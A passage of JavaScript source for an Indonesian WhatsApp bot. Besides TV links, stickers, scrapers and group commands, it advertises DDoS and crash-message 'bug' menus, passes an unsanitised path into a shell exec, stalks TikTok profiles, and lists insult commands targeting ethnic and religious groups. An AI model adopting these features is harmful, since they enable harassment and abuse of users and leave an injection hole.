"buttonParamsJson": `{ "title": "ꜱᴇʟᴇᴄᴛ ᴀ ᴍᴇɴᴜ!", "sections": [{ "title": "# ᴛʜɪs ɪs ᴀ ᴘʀᴏᴊᴇᴄᴛ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇᴍᴘᴇʀᴏʀ", "highlight_label": \"sʟᴀʏᴇʀ ᴠ6\", "rows": [{ "header": "AllMenu", "title": "♱ ᴍᴇɴᴜᴀʟʟ", "id": ".menuall" }, 
{ "header": "Menux", "title": "♱ ᴇ-ᴍᴇɴᴜ", "id": ".menux" }, 
{ "header": "AiMenu", "title": "♱ ᴀɪᴍᴇɴᴜ", "id": ".aimenu" }, 
{ "header": "BugMenu", "title": "♱ ʙᴜɢᴍᴇɴᴜ", "id": ".bugmenu" }, 
{ "header": "OwnerMenu", "title": "♱ ᴏᴡɴᴇʀᴍᴇɴᴜ", "id": ".ownermenu" }, 
{ "header": "GroupMenu", "title": "♱ ɢʀᴏᴜᴘᴍᴇɴᴜ", "id": ".groupmenu" }, 
{ "header": "SearchMenu", "title": "♱ ꜱᴇᴀʀᴄʜᴍᴇɴᴜ", "id": ".searchmenu" }, 
{ "header": "DownloadMenu", "title": " ♱ ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ", "id": ".downloadmenu" }, 
{ "header": "DdosMenu", "title": "♱ ᴅᴅᴏꜱ ᴍᴇɴᴜ", "id": ".ddosmenu" }, 
{ "header": "VpsMenu", "title": "♱ ᴠᴘꜱᴍᴇɴᴜ", "id": ".vpsmenu" }, 
{ "header": "DigitalOceanMenu", "title": "♱ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴᴍᴇɴᴜ", "id": ".digitaloceanmenu" }]}]}`
},
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{\"display_text\":\"Group sᴜᴘᴘᴏʀᴛ\",\"url\":\"https://chat.whatsapp.com/HIvICIvQ8hL4PmqBu7a2C6\",\"merchant_url\":\"https://chat.whatsapp.com/HIvICIvQ8hL4PmqBu7a2C6\"}`
                      }]
                    })
                  }
                  ]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qkontak })
        await cay.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
        await cay.sendMessage(m.chat, {
          audio: { url: audioFile },
          mimetype: 'audio/mpeg'
        }, { quoted: msgii })
      }
        break
//nonton tv
case "nontontv":
case 'tv':
{

let teksk = `PILIH POLLING BERIKUT

dibawah adalah list dari channel top di televisi
pilih polling dari channel yang ingin di tonton
setelah itu bot akan memberi channel yang ingin
anda tonton dengan berupa link`
cay.sendPoll(from, teksk, ['TVINTERNASIONAL','GLOBALTV','MNCTV','RCTI','TRANSTV','TRANS7','ANTV','SCTV','NET','INDOSIAR'])
}
break
case "tvinternasional":
{
let teksb = `📺SALURAN TELEVISI GELOMBANG DUNIA📺`
let channel = `https://photocall.tv/`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "globaltv": case "gtv":
{

let teksz = `📺SALURAN TELEVISI GLOBAL TV📺`
let channel = `https://m.rctiplus.com/tv/globaltv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksz}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksz,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: true
}
}}, {quoted: m})
}
break
case "rcti":
{



let teksy = `📺SALURAN TELEVISI RCTI📺`
let channel = `https://m.rctiplus.com/tv/rcti`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksy}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksy,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "mnctv":
{
let teksuu = `📺SALURAN TELEVISI MNCTV📺`
let channel = `https://m.rctiplus.com/tv/mnctv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksuu}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksuu,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "transtv":
{

let teksbn = `📺SALURAN TELEVISI TRANS TV📺`
let channel = `https://www.transtv.co.id/live`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksbn}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksbn,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break

case "trans7":
{

let tekshb = `📺SALURAN TELEVISI TRANS 7📺`
let channel = `https://www.transtv.co.id/live/trans7`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${tekshb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekshb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break 
case "antv":
{
let tekshbb = `📺SALURAN TELEVISI ANTV📺`
let channel = `https://m.vidio.com/live/782-antv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${tekshbb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekshbb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break 
case "sctv":
{

let teksknn = `📺SALURAN TELEVISI SCTV📺`
let channel = `https://m.vidio.com/live/204`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksknn}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksknn,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break 
case "nettv": case "net":
{
let teksim = `📺SALURAN TELEVISI NET TV📺`
let channel = `https://www.netmedia.co.id/live-streaming`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${teksim}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksim,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break 
case "indosiar":
{

let tekskop = `📺SALURAN TELEVISI INDOSIAR📺`
let channel = `https://m.vidio.com/live/205`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

cay.sendMessage(m.chat, {text: `${tekskop}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekskop,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
//?!
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) reply `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await cay.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await cay.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//bats
case 'hdvideo':
case 'hdvid': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? qyuunee.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(`Vidionya mana?`);
  m.reply("wait.. agak lama cuy");
  let { TelegraPh } = require('../all/uploader.js')
  const media = await quoted.download()
  /*const url = await TelegraPh(media);*/
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    cay.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: qkontak});
  });
  
            
}
break

case 'anilist': {
  if (!text) return m.reply("Example: .anilist naruto")
function anilist(query) {
  return new Promise((resolve, reject) => {
    axios.get('https://anilist.co/search/anime?search=' + query)
      .then(response => {
        const $ = cheerio.load(response.data);
        const anime = []
        const ling = []
        const image = []
        
        $('div.media-card a').each(function(a, b) {
          ling.push('https://anilist.co' + $(b).attr('href'))
        })
        
        $('div.media-card a img').each(function(a, b) {
          image.push($(b).attr('src'))
        })
        
        for (let i = 0; i < 10; i++) {
          const link = ling[i]
          const gambar = image[i]
          anime.push({
            link, gambar
          });
        }
        resolve(anime);
      })
      .catch(error => {
        reject(error);
      });
  });
}

async function anilistdetail(url) {
  try {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);

    const title = $('meta[property="og:title"]').attr('content');
    const description = $('meta[property="og:description"]').attr('content');

    const animeData = {
      title,
      description
    };

    return animeData
  } catch (error) {
    console.error(error);
  }
}
const date = await anilist(text)
const kanjut = await anilistdetail(date[0].link)
cay.sendMessage(m.chat, {image: {url: `${date[0].gambar}`}, caption: `Hasil Pencarian Anime:

Judul: ${kanjut.title}
Deskripsi: ${kanjut.description}
Link: ${date[0].link}
`}, {quoted: qkontak})
}
break

case 'ttstalk':{
//wm senn
async function tiktokStalk(user) {
    let res = await axios.get(`https://urlebird.com/user/${user}/`)
//wm senn
         let $ = cheerio.load(res.data), obj = {}
             obj.pp_user = $('div[class="col-md-auto justify-content-center text-center"] > img').attr('src')
                 obj.name = $('h1.user').text().trim()
//wm senn
                 obj.username = $('div.content > h5').text().trim()
               obj.followers = $('div[class="col-7 col-md-auto text-truncate"]').text().trim().split(' ')[1]
//wm senn
           obj.following = $('div[class="col-auto d-none d-sm-block text-truncate"]').text().trim().split(' ')[1]
//wm senn
     obj.description = $('div.content > p').text().trim()
  return obj
//wm senn
} 
if (!text) return m.reply(`Masukan nama pengguna!!\nExample ${prefix + command} sen.h`)
//wm senn
let data = await tiktokStalk(text)
let cap = `\`\`\`「 Tiktok Stalk 」\`\`\`

Nama : ${data.name}
Username : ${data.username}
Pengikut : ${data.followers}
Mengikuti : ${data.following}
Bio : ${data.description}
`

cay.sendMessage(m.chat, { image: { url: data.pp_user }, caption: cap }, { quoted: qkontak })

}
break
/*case "menuquotes":
case "jembot": {
const text12 = ``
cay.sendMessage(m.chat, {
 image: fs.readFileSync('./media/hutao4.jpg'),
 gifPlayback: false,
 
 caption: text12,
 contextInfo: {
 externalAdReply: {
 title: 'asuma-MD',
 body: 'Creator : orang ganteng',
 thumbnailUrl: 'https://files.catbox.moe/s3gh7h.jpg',
 sourceUrl: `https://chat.whatsapp.com/J4Dob6DExA57DrqiFxdMfg`,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 })
 } freya = fs.readFileSync('./media/baa.mp3')
cay.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break*/

case "gamemenu":
case "menugame":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
             _*G A M E*_  
╰◈${prefix}werewolf
╰◈${prefix}suit *tag atau reply*
╰◈${prefix}tictactoe *tag atau reply*
╰◈${prefix}delttt
╰◈${prefix}petakbom
╰◈${prefix}delpetakbom
╰◈${prefix}tebakgambar
╰◈${prefix}tebakanime
╰◈${prefix}tebakkabupaten
╰◈${prefix}tebaklagu
╰◈${prefix}kuis
╰◈${prefix}tebakkalimat
╰◈${prefix}tebakkata
╰◈${prefix}tebaklirik
╰◈${prefix}tebakkimia
╰◈${prefix}tebakbendera
╰◈${prefix}susunkata
╰◈${prefix}asahotak
╰◈${prefix}siapakahaku
╰◈${prefix}caklontong
╰◈${prefix}math
╰◈${prefix}family100
`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/mikir.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

/*case 'req': case 'error': case 'report':
case 'request': case 'reportbug': {

	if (!text) return m.reply(`Example : ${
        prefix + command
      } hi dev fitur play is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hai ${pushname}, permintaan Anda telah diteruskan ke pemilik saya*.\n*harap tunggu...*`
            for (let i of owner) {
cay.sendMessage("6287875411618@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
           cay.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break*/
//req
/*case "bugmenu":
case "menubug":{
loading()
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ bag menu ≫*┈─⊡
╰◈ ${prefix}pler
╰◈ ${prefix}bagbot
╰◈ ${prefix}xios
╰◈ ${prefix}xkill
╰◈ ${prefix}cay
╰◈ ${prefix}xasuma
╰◈ ${prefix}plerkuda
╰◈ ${prefix}xcombo
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/starboy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break*/

case "idgc": {
if (!isOwner) return reply(msg.owner)
reply(`${m.chat}`)
}
break
case "cekidch":
case "idch": {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return reply("reply pesan saluran")
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo 
let send_ch = `\n*Berikut Informasi Channel WhatsApp*\n
*Nama :* ${id.newsletterName}\n*ID :* ${id.newsletterJid}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: send_ch
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID\",\"id\":\"123456789\",\"copy_code\":\"${id.newsletterJid}\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
});
}
break
case "listgc": case "cekidgc": case"listgrup": {
let gcall = Object.values(await cay.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
cay.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `© ${namabot}`,  sourceUrl: global.linkgc2, previewType: "PHOTO"}}}, {quoted: qtext2})
}
break
case "joingc": case "join": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await cay.groupAcceptInvite(result).then(respon => reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => reply(error.toString()))
}
break
case "out": case "leave": case "leavegc": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
await reply("Okay Bang")
await sleep(3000)
await cay.groupLeave(m.chat)
}
break
case "out2": case "leavegc2": case "leave2": {
if (!isOwner) return reply(msg.owner)
let gcall = await Object.values(await cay.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Command :*\nKetik *${cmd}* nomor grup\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
cay.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `© ${namabot}`,  sourceUrl: global.group, previewType: "PHOTO"}}}, {quoted: qtext2})
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await cay.groupLeave(`${gcall[leav].id}`)
}}
break
//powered by dits
 case 'play': {
if (!text) return reply(`Contoh: ${prefix + command} dj tiktok`);
reply("Proses!");
try {
async function getBuffer(url) {
const res = await axios({
method: 'get',
url,
responseType: 'arraybuffer'
});
return res.data;
}
const look = await search(text);
const convert = look.videos[0];
if (!convert) return m.reply('Audio Tidak Ditemukan');
if (convert.seconds >= 3600) {
return reply('Audio is longer than 1 hour!');
}
let audioUrl;
try {
audioUrl = await youtube(convert.url);
} catch (e) {
reply("Retrying...");
audioUrl = await youtube(convert.url);
}
const thumbBuffer = await getBuffer(convert.thumbnail);
await cay.sendMessage(m.chat, {
audio: {
url: audioUrl.mp3
},
mimetype: 'audio/mpeg',
}, {
quoted: qmime
});
} catch (e) {
reply(`*Error:* ${e.message}`);
}
};
break
case "menustore":
case "storemenu":{
const tek = `*aloo* @${m?.sender.split('@')[0]} ${readmore}
╭─┈ *⪻ menustore ≫*┈─⊡
╰◈ ${prefix}
╰◈ ${prefix}topup-cod
╰◈ ${prefix}pulsa-m3
╰◈ ${prefix}pulsa-telkomsel
╰◈ ${prefix}pulsa-axis
╰◈ ${prefix}pulsa-smartfren 
╰◈ ${prefix}pulsa-byu
╰◈ ${prefix}kouta-axis
╰◈ ${prefix}topup-ml
╰◈ ${prefix}topup-ff
╰◈ ${prefix}topup-pubg
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${namastore}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/mikir.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break
/*case 'storemenu':{
reply('sedang tahap pengembangan')
}
break*/
case 'topupmenu':{
reply('sedang tahap pengembangan')
}
break
case "menusearch":
case "searchmenu":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
┏ ⪻ 𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}pin
╰◈ ${prefix}ytmp3
╰◈ ${prefix}ytmp4
╰◈ ${prefix}ttstalk
╰◈ ${prefix}vtuber
╰◈ ${prefix}play
╰◈ ${prefix}bokep 1/20
╰◈ ${prefix}webtoon
╰◈ ${prefix}film
╰◈ ${prefix}filmsearch
╰◈ ${prefix}anilist
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/starboy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
/*case "searchmenu":{
let menu = `
┏ ⪻ 𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}spotify
╰◈ ${prefix}pin
╰◈ ${prefix}ytmp3
╰◈ ${prefix}ttstalk
╰◈ ${prefix}vtuber
╰◈ ${prefix}webtoon
╰◈ ${prefix}film
╰◈ ${prefix}filmsearch
╰◈ ${prefix}anilist
┗──≫
`
cay.sendMessage(m.chat, {
text: menu,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: namabot,
newsletterJid: idsaluran,
},
externalAdReply: {
title: namabot,
body: namaowner,
thumbnailUrl: thumb,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})
}
break*/
case 'funmenu':  case 'menufun':{
     
//if (!isRegistered) return registerbut(noregis)
let u = `\n*\`</> 乂 LIST  FUNMENU乂 </>\`*\n`
let dits = `> • _.cekkontol_
> • _.cekmemek_ 
> • _.cekkhodam_ 
> • _.checkme_ 
> • _.kontol_
> • _.cabul_ 
> • _.tolol_ 
> • _.goblog/goblok_ 
> • _.idiot_ 
> • _.gay_
> • _.jomok_ 
> • _.bajingan_ 
> • _.munafik_
> • _.kontol_
> • _.yatim_ 
> • _.poke_ 
> • _.pembokep_ 
> • _.fembokef_
> • _.pengocok_
> • _.hitam_
> • _.hytam_ 
> • _.bego_ 
> • _.jawa_ 
> • _.wibu_ 
> • _.stress_
> • _.miskin_ 
> • _.cantik_ 
> • _.ganteng_
> • _.manis_
> • _.babi_ 
> • _.cina_ 
> • _.atheis_ 
> • _.papua_
> • _.pengentot_ 
> • _.seksi_ 
> • _.kawai_ 
> • _.tercindo_ 
> • _.cabul_
> • _.fuckboy_ 
> • _.fuckgirl_
> • _.playboy_ 
> • _.playgirl_
> • _.sange_
> • _.hot_
> • _.sangean_\n`
let mmm = `${global.namabot}`
let info = `${monospace(mmm)}`
  const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
      contextInfo: {
        	mentionedJid: [m.sender], 
        	isForwarded: true, 
	        forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'asuma Only', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
            externalAdReply: {  
                title: 'asuma -CMD', 
                thumbnailUrl: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg', 
                sourceUrl: 'https://tiktok.com/@paadit',
                mediaType: 2,
                renderLargerThumbnail: false
            }
          }, 
        body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `hy @${m.sender.split("@")[0]}`,
        }), 
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: false
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [              
               {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${dits}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: ppuser } }, { upload: cay.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"owner🤖\",\"url\":\"https:/wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "cta_url",
